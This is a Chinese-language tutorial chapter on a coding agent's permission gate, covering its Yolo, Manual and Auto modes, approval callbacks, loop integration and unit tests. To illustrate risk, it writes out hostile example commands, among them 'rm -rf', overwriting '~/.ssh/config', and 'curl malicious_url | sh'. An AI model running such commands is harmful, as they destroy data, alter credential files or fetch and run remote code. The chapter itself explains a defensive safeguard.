# 第7章：权限系统深度剖析

> 权限系统控制危险操作的执行，防止意外或恶意行为。

## 1. 为什么需要权限系统？

### 1.1 Agent 的风险

Agent 可以执行很多操作：
- 删除文件：`Bash("rm -rf important_folder")`
- 修改配置：`Write("~/.ssh/config", malicious_content)`
- 执行任意命令：`Bash("curl malicious_url | sh")`

**风险来源**：
1. **用户误操作**：用户说"删除临时文件"，Agent 理解为删除整个项目
2. **LLM 误解**：LLM 对用户意图的理解偏差
3. **恶意输入**：用户输入被注入攻击（如："请帮我... [同时悄悄执行 rm -rf]"）

### 1.2 权限系统的目标

**核心目标**：在执行危险操作前，让用户确认。

```
Agent 决定执行: Write("important.txt", "new content")
        ↓
权限系统检查: 写文件需要权限
        ↓
询问用户: "将写入 'new content' 到 'important.txt'，允许吗？"
        ↓
用户决定: 允许 / 拒绝
        ↓
允许 → 执行
拒绝 → 跳过，返回错误
```

## 2. PermissionMode（权限模式）

### 2.1 三种模式

```cpp
// 位置：Source/CodeHarness/Config/ConfigTypes.h
enum class PermissionMode
{
    Yolo,   // 全允许：不询问，直接执行
    Manual, // 手动：每个危险操作都询问
    Auto,   // 自动：首次询问后，同类操作自动允许
};
```

**模式对比**：

| 模式 | 读文件 | 写文件 | 执行命令 | 适用场景 |
|------|--------|--------|----------|----------|
| Yolo | ✅ | ✅ | ✅ | 快速原型、测试 |
| Manual | ✅ | ❓询问 | ❓询问 | 生产环境、新手用户 |
| Auto | ✅ | ✅首次后自动 | ❓询问 | 有经验的用户 |

### 2.2 模式详解

#### Yolo 模式

**特点**：所有操作自动允许

```cpp
// 权限门控逻辑
bool ShouldRun_Yolo(bool requiresPermission, ...) {
    return true;  // 总是允许
}
```

**适用场景**：
- 快速原型开发
- 测试环境
- 用户完全信任 Agent

**风险**：Agent 可能执行危险操作，无警告

#### Manual 模式

**特点**：每个危险操作都询问

```cpp
bool ShouldRun_Manual(bool requiresPermission, ...) {
    if (!requiresPermission) {
        return true;  // 安全操作直接允许
    }
    
    // 调用回调询问用户
    return callback(toolName, args, description) == Allow;
}
```

**适用场景**：
- 生产环境
- 新手用户
- 需要精细控制

**优点**：用户完全控制

**缺点**：频繁询问，可能打断工作流

#### Auto 模式（MVP 未完整实现）

**设计意图**：首次询问，之后自动

```cpp
bool ShouldRun_Auto(bool requiresPermission, ...) {
    if (!requiresPermission) {
        return true;
    }
    
    // 检查是否已批准过类似操作
    if (sessionCache.contains(toolName + argsHash)) {
        return true;  // 已批准，自动允许
    }
    
    // 首次，询问用户
    auto decision = callback(toolName, args, description);
    if (decision == Allow) {
        sessionCache.add(toolName + argsHash);  // 记住批准
    }
    return decision == Allow;
}
```

**当前 MVP 实现**：
- Auto 模式被识别但行为同 Manual
- 发出一次性警告
- 完整的 Auto 需要 Session 模块（会话级缓存）

## 3. PermissionGate 实现

### 3.1 类定义

**位置**：`Source/CodeHarness/Permission/PermissionGate.h`

```cpp
// 权限门控：决定工具是否可以执行
//
// 模式语义（MVP）：
//   - Yolo:   所有工具允许，不调用回调
//   - Manual: 安全操作（requiresPermission == false）直接允许
//             危险操作调用回调，只有 Allow 才执行
//   - Auto:   未完整实现，行为同 Manual + 一次性警告
//
// 门控不持有会话状态，可以跨 Turn 重用
class PermissionGate
{
public:
    // 构造：指定模式和回调
    PermissionGate(config::PermissionMode mode, ApprovalCallback callback);
    
    // 判断工具是否可以运行
    // 参数：
    //   requiresPermission - 是否需要权限（来自 ResolveExecution）
    //   toolName - 工具名称
    //   args - 工具参数
    //   description - 操作描述（来自 ResolveExecution）
    // 返回：true 允许执行，false 拒绝
    bool ShouldRun(
        bool requiresPermission,
        std::string_view toolName,
        const nlohmann::json& args,
        std::string_view description
    );
    
    // 获取当前模式
    config::PermissionMode Mode() const { return mode_; }

private:
    config::PermissionMode mode_;
    ApprovalCallback callback_;
    bool autoWarned_ = false;  // Auto 模式的一次性警告标志
};
```

### 3.2 ShouldRun 实现

```cpp
bool PermissionGate::ShouldRun(
    bool requiresPermission,
    std::string_view toolName,
    const nlohmann::json& args,
    std::string_view description
) {
    // ===== 1. 安全操作直接允许 =====
    if (!requiresPermission) {
        return true;
    }

    // ===== 2. 根据模式处理 =====
    switch (mode_) {
        case config::PermissionMode::Yolo:
            // Yolo: 直接允许
            return true;

        case config::PermissionMode::Manual:
            // Manual: 调用回调询问
            if (!callback_) {
                // 无回调，安全默认：拒绝
                return false;
            }
            return callback_(toolName, args, description) == PermissionDecision::Allow;

        case config::PermissionMode::Auto:
            // Auto (MVP): 行为同 Manual + 一次性警告
            if (!autoWarned_) {
                spdlog::warn("Auto mode not fully implemented; falling back to Manual behavior");
                autoWarned_ = true;
            }
            if (!callback_) {
                return false;
            }
            return callback_(toolName, args, description) == PermissionDecision::Allow;
    }

    return false;  // 未知模式，安全默认
}
```

## 4. ApprovalCallback 类型

### 4.1 类型定义

```cpp
// 位置：Source/CodeHarness/Permission/PermissionTypes.h

// 权限决策
enum class PermissionDecision
{
    Allow,  // 允许执行
    Deny,   // 拒绝执行
};

// 审批回调签名
using ApprovalCallback = std::function<PermissionDecision(
    std::string_view toolName,       // 工具名称
    const nlohmann::json& args,      // 工具参数
    std::string_view description     // 操作描述
)>;
```

### 4.2 回调实现示例

#### CLI 简单询问

```cpp
ApprovalCallback simpleCliCallback = [](std::string_view toolName, const json& args, std::string_view description) {
    std::cout << "\n=== Permission Request ===\n";
    std::cout << "Tool: " << toolName << "\n";
    std::cout << "Description: " << description << "\n";
    std::cout << "Arguments: " << args.dump(2) << "\n";
    std::cout << "\nAllow this operation? [y/N]: ";
    
    char c;
    std::cin >> c;
    
    return c == 'y' || c == 'Y' ? PermissionDecision::Allow : PermissionDecision::Deny;
};
```

#### TUI 详细界面

```cpp
ApprovalCallback tuiCallback = [](std::string_view toolName, const json& args, std::string_view description) {
    // 在 TUI 中显示详细界面
    // 可能包含：
    // - 操作描述
    // - 参数详情
    // - 风险提示
    // - 用户选择按钮（Allow/Deny/View Details）
    
    // 返回用户选择
    return waitForUserDecision();
};
```

#### 自动批准（测试用）

```cpp
ApprovalCallback autoApproveCallback = [](auto, auto, auto) {
    return PermissionDecision::Allow;
};
```

#### 自动拒绝

```cpp
ApprovalCallback autoDenyCallback = [](auto, auto, auto) {
    return PermissionDecision::Deny;
};
```

## 5. 与 Loop 的集成

### 5.1 集成位置

**位置**：`Source/CodeHarness/Engine/Loop.cpp:49-61`

```cpp
// 在 ExecuteToolCall 中
const auto& exec = *resolution;

// 权限门控：requiresPermission 变为实际检查的唯一点
if (input.permissionGate != nullptr && exec.requiresPermission) {
    // 发送权限请求事件（通知 UI）
    Dispatch(input, PermissionRequestedEvent{tc.name, args, exec.description});
    
    // 询问门控
    if (!input.permissionGate->ShouldRun(true, tc.name, args, exec.description)) {
        // 拒绝
        Dispatch(input, PermissionDeniedEvent{tc.name, exec.description});
        return {.content = fmt::format("permission denied for tool '{}'", tc.name), .isError = true};
    }
}

// 允许，继续执行
auto result = tool.Execute(args, ctx);
```

### 5.2 事件通知

**为什么需要事件？**
- 让 UI/TUI 可以显示权限请求界面
- 记录权限决策历史

```cpp
// 权限请求事件
struct PermissionRequestedEvent
{
    std::string toolName;
    nlohmann::json args;
    std::string description;
};

// 权限拒绝事件
struct PermissionDeniedEvent
{
    std::string toolName;
    std::string description;
};
```

### 5.3 流程图

```
工具调用请求
        ↓
┌───────────────────────────────────┐
│ ResolveExecution(args)            │
│ → ToolExecution                   │
│   {description, requiresPermission}│
└───────────────┬───────────────────┘
                ↓
┌───────────────────────────────────┐
│ requiresPermission == false?      │
└───────────────┬───────────────────┘
        ┌───────┴───────┐
        │ Yes           │ No
        ↓               ↓
┌─────────────┐ ┌─────────────────────────────────────┐
│ 直接执行    │ │ permissionGate != nullptr?          │
│ Execute()   │ └───────────────┬─────────────────────┘
└─────────────┘         ┌───────┴───────┐
                        │ Yes           │ No (无门控)
                        ↓               ↓
                ┌───────────────┐ ┌─────────────┐
                │ 发送          │ │ 直接执行    │
                │ Permission    │ │ (旧行为)    │
                │ RequestedEvent│ └─────────────┘
                └─────────┬─────┘
                          ↓
                ┌─────────────────┐
                │ ShouldRun()?    │
                └─────────┬───────┘
                    ┌─────┴─────┐
                    │ Allow     │ Deny
                    ↓           ↓
            ┌─────────────┐ ┌─────────────────────┐
            │ Execute()   │ │ PermissionDeniedEvent│
            └─────────────┘ │ + 返回错误           │
                            └─────────────────────┘
```

## 6. 与 Agent 的集成

### 6.1 Agent 设置权限

```cpp
// Agent.h
void SetPermissionMode(config::PermissionMode mode);
void SetApprovalCallback(ApprovalCallback callback);

// Agent.cpp
void Agent::SetPermissionMode(config::PermissionMode mode)
{
    permissionMode = mode;
    permissionGate = std::make_unique<PermissionGate>(mode, approvalCallback);
}

void Agent::SetApprovalCallback(ApprovalCallback callback)
{
    approvalCallback = callback;
    if (permissionMode) {
        permissionGate = std::make_unique<PermissionGate>(*permissionMode, approvalCallback);
    }
}
```

### 6.2 Prompt 时传入

```cpp
// Agent::Prompt 中
engine::TurnInput input;
input.permissionGate = permissionGate.get();

auto result = engine::RunTurn(input, {});
```

## 7. 工具的 requiresPermission

### 7.1 工具如何标记需要权限

**在 ResolveExecution 中设置**：

```cpp
// Bash 工具
absl::StatusOr<ToolExecution> BashTool::ResolveExecution(const nlohmann::json& args) {
    // 验证参数...
    
    return ToolExecution{
        .description = fmt::format("Execute: {}", args["command"].get<std::string>()),
        .requiresPermission = true  // Bash 命令需要权限
    };
}

// Read 工具
absl::StatusOr<ToolExecution> ReadFileTool::ResolveExecution(const nlohmann::json& args) {
    // 验证参数...
    
    return ToolExecution{
        .description = fmt::format("Read file: {}", args["path"].get<std::string>()),
        .requiresPermission = false  // 读文件不需要权限
    };
}
```

### 7.2 工具权限分类

| 工具 | requiresPermission | 原因 |
|------|---------------------|------|
| Read | false | 只读，安全 |
| Glob | false | 只读，安全 |
| Grep | false | 只读，安全 |
| Write | true | 写入，可能破坏 |
| Edit | true | 修改，可能破坏 |
| Bash | true | 执行命令，高风险 |

## 8. 测试分析

### 8.1 PermissionGate 测试

```cpp
TEST(PermissionGate, YoloMode) {
    PermissionGate gate(PermissionMode::Yolo, {});
    
    EXPECT_TRUE(gate.ShouldRun(true, "Bash", {}, "rm -rf"));
    EXPECT_TRUE(gate.ShouldRun(false, "Read", {}, "read"));
}

TEST(PermissionGate, ManualMode_Allow) {
    auto callback = [](auto, auto, auto) { return PermissionDecision::Allow; };
    PermissionGate gate(PermissionMode::Manual, callback);
    
    EXPECT_TRUE(gate.ShouldRun(true, "Bash", {}, "rm -rf"));
}

TEST(PermissionGate, ManualMode_Deny) {
    auto callback = [](auto, auto, auto) { return PermissionDecision::Deny; };
    PermissionGate gate(PermissionMode::Manual, callback);
    
    EXPECT_FALSE(gate.ShouldRun(true, "Bash", {}, "rm -rf"));
}

TEST(PermissionGate, ManualMode_NoCallback) {
    PermissionGate gate(PermissionMode::Manual, {});
    
    // 无回调时，危险操作默认拒绝
    EXPECT_FALSE(gate.ShouldRun(true, "Bash", {}, "rm -rf"));
    
    // 安全操作仍允许
    EXPECT_TRUE(gate.ShouldRun(false, "Read", {}, "read"));
}

TEST(PermissionGate, ManualMode_ReadOnlyAlwaysAllowed) {
    auto callback = [](auto, auto, auto) { return PermissionDecision::Deny; };
    PermissionGate gate(PermissionMode::Manual, callback);
    
    // 即使回调总是拒绝，安全操作仍允许
    EXPECT_TRUE(gate.ShouldRun(false, "Read", {}, "read"));
}
```

### 8.2 Loop 权限测试

```cpp
TEST(Loop, PermissionGateBlocksDangerousTool) {
    MockChatProvider provider;
    provider.responses = {
        {
            .toolCalls = {llm::ToolCall{"1", "Bash", "{\"command\":\"rm\"}"}},
            .finishReason = llm::FinishReason::ToolCalls
        },
        {.finishReason = llm::FinishReason::Completed}
    };
    
    MockTool bashTool;
    bashTool.resolveHandler = [](auto) {
        return ToolExecution{.requiresPermission = true, .description = "rm"};
    };
    
    PermissionGate gate(PermissionMode::Manual, [](auto, auto, auto) {
        return PermissionDecision::Deny;
    });
    
    TurnInput input;
    input.provider = &provider;
    input.tools = {&bashTool};
    input.permissionGate = &gate;
    
    auto result = RunTurn(input);
    
    // 工具被拒绝
    // 历史中应该有错误消息
}
```

## 9. 类关系图

```
┌─────────────────────────────────────────────────────────────────────┐
│                       PermissionGate                                 │
├─────────────────────────────────────────────────────────────────────┤
│  成员:                                                               │
│  - mode_: PermissionMode                                             │
│  - callback_: ApprovalCallback                                       │
│  - autoWarned_: bool                                                 │
│                                                                      │
│  方法:                                                               │
│  + ShouldRun(requiresPermission, toolName, args, description)       │
│  + Mode() → PermissionMode                                           │
└─────────────────────────────────────────────────────────────────────┘
        │
        │ 使用
        ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     ApprovalCallback                                 │
│                                                                      │
│  签名: PermissionDecision (toolName, args, description)             │
│                                                                      │
│  实现:                                                               │
│  - CLI 简单询问                                                      │
│  - TUI 详细界面                                                      │
│  - 测试自动批准/拒绝                                                  │
└─────────────────────────────────────────────────────────────────────┘
        │
        │ 返回
        ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     PermissionDecision                               │
│  - Allow                                                             │
│  - Deny                                                              │
└─────────────────────────────────────────────────────────────────────┘

集成关系：

Agent ─────→ PermissionGate (owned)
    │           │
    │           │ ShouldRun()
    │           │
    └───────────→ Loop.RunTurn()
                    │
                    │ ExecuteToolCall()
                    │
                    └──→ PermissionGate.ShouldRun()
```

## 10. 小结

本章我们学习了：

- **为什么需要权限系统**：防止意外/恶意操作
- **三种权限模式**：Yolo、Manual、Auto
- **PermissionGate 实现**：ShouldRun 方法
- **ApprovalCallback**：用户审批回调
- **与 Loop 的集成**：在 ExecuteToolCall 中检查
- **与 Agent 的集成**：SetPermissionMode、SetApprovalCallback
- **工具标记权限**：ToolExecution.requiresPermission

## 11. 练习建议

1. **阅读源码**：打开 `Permission/PermissionGate.cpp`，理解 ShouldRun 逻辑
2. **写回调**：实现一个 CLI 询问回调，显示详细信息
3. **思考题**：Auto 模式的完整实现需要什么额外信息？

## 12. 下一步

下一章我们将深入 **会话与事件溯源**，理解持久化机制。

→ [08-session-records.md](08-session-records.md)